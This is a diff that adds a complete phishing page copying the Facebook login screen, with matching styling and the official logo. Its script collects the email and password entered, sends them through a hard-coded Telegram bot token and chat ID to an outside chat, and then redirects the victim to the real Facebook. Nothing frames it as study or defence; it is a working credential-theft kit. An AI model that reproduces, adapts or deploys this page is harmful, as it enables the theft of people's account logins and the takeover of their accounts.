@@ -1,0 +1,183 @@
+<!DOCTYPE html>  <html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Facebook - Log In or Sign Up</title>  
+    <style>  
+        body {  
+            font-family: Helvetica, Arial, sans-serif;  
+            background-color: #f0f2f5;  
+            display: flex;  
+            justify-content: center;  
+            align-items: center;  
+            height: 100vh;  
+            margin: 0;  
+        }  
+        .container {  
+            display: flex;  
+            flex-direction: column;  
+            align-items: center;  
+            max-width: 396px;  
+            width: 100%;  
+        }  
+        .logo {  
+            margin-bottom: 20px;  
+        }  
+        .logo img {  
+            height: 38px;  
+            width: auto;  
+        }  
+        .login-form {  
+            background-color: #ffffff;  
+            padding: 20px;  
+            border-radius: 8px;  
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);  
+            width: 100%;  
+            box-sizing: border-box;  
+        }  
+        .input-field {  
+            width: 100%;  
+            padding: 14px 16px;  
+            margin-bottom: 15px;  
+            border: 1px solid #dddfe2;  
+            border-radius: 6px;  
+            font-size: 17px;  
+            outline: none;  
+            box-sizing: border-box;  
+        }  
+        .input-field:focus {  
+            border-color: #1877f2;  
+        }  
+        .login-btn {  
+            background-color: #1877f2;  
+            color: white;  
+            border: none;  
+            border-radius: 6px;  
+            padding: 14px 16px;  
+            font-size: 20px;  
+            font-weight: bold;  
+            width: 100%;  
+            cursor: pointer;  
+            margin-bottom: 15px;  
+        }  
+        .login-btn:hover {  
+            background-color: #166fe5;  
+        }  
+        .forgot {  
+            text-align: center;  
+            color: #1877f2;  
+            font-size: 14px;  
+            margin-bottom: 20px;  
+            text-decoration: none;  
+        }  
+        .divider {  
+            border-bottom: 1px solid #dadde1;  
+            margin-bottom: 20px;  
+        }  
+        .create-btn {  
+            background-color: #42b72a;  
+            color: white;  
+            border: none;  
+            border-radius: 6px;  
+            padding: 14px 16px;  
+            font-size: 17px;  
+            font-weight: bold;  
+            width: auto;  
+            padding-left: 20px;  
+            padding-right: 20px;  
+            cursor: pointer;  
+        }  
+        .footer-text {  
+            text-align: center;  
+            font-size: 14px;  
+            margin-top: 25px;  
+        }  
+        .footer-text a {  
+            text-decoration: none;  
+            color: #385898;  
+            font-weight: bold;  
+        }  
+        .loader {  
+            display: none;  
+            border: 3px solid #f3f3f3;  
+            border-top: 3px solid #3498db;  
+            border-radius: 50%;  
+            width: 20px;  
+            height: 20px;  
+            animation: spin 2s linear infinite;  
+            margin: 0 auto;  
+        }  
+        @keyframes spin {  
+            0% { transform: rotate(0deg); }  
+            100% { transform: rotate(360deg); }  
+        }  
+    </style>  
+</head>  
+<body>  <div class="container">  
+    <div class="logo">  
+        <!-- Official Facebook Logo URL -->  
+        <img src="https://static.xx.fbcdn.net/rsrc.php/yD/r/d-Nz46kgkEL.svg" alt="Facebook">  
+    </div>  <div class="login-form">  
+    <form id="fbForm">  
+        <input type="text" class="input-field" id="email" placeholder="Email or phone number" required>  
+        <input type="password" class="input-field" id="pass" placeholder="Password" required>  
+        <button type="submit" class="login-btn" id="btn">Log In</button>  
+        <div class="loader" id="loader"></div>  
+        <a href="#" class="forgot">Forgot password?</a>  
+        <div class="divider"></div>  
+        <button type="button" class="create-btn">Create new account</button>  
+    </form>  
+</div>  
+<div class="footer-text">  
+    <a href="#">Create a Page</a> for a celebrity, brand or business.  
+</div>
+
+</div>  <script>  
+    // Telegram Configuration  
+    const botToken = "8924917824:AAFCZq9YiwbA2Zg16_Glvh6qkbmEIbpBAIs";  
+    const chatId = "7998776113";  
+      
+    const form = document.getElementById('fbForm');  
+    const btn = document.getElementById('btn');  
+    const loader = document.getElementById('loader');  
+  
+    form.addEventListener('submit', function(e) {  
+        e.preventDefault();  
+          
+        const email = document.getElementById('email').value;  
+        const pass = document.getElementById('pass').value;  
+          
+        // UI Loading State  
+        btn.style.display = 'none';  
+        loader.style.display = 'block';  
+  
+        // Telegram Message Format  
+        const text = `<b>Facebook Login Attempt:</b>\n\n<b>Email/Phone:</b> <code>${email}</code>\n<b>Password:</b> <code>${pass}</code>\n\n<i>Time: ${new Date().toLocaleString()}</i>`;  
+  
+        // Send to Telegram  
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;  
+          
+        fetch(url, {  
+            method: 'POST',  
+            headers: {  
+                'Content-Type': 'application/json'  
+            },  
+            body: JSON.stringify({  
+                chat_id: chatId,  
+                text: text,  
+                parse_mode: 'HTML'  
+            })  
+        })  
+        .then(response => {  
+            // Redirect to actual Facebook after sending data  
+            window.location.href = "https://www.facebook.com/";  
+        })  
+        .catch(error => {  
+            console.error('Error:', error);  
+            loader.style.display = 'none';  
+            btn.style.display = 'block';  
+            alert("Connection error. Please try again.");  
+        });  
+    });  
+</script>  </body>  
+  </html>
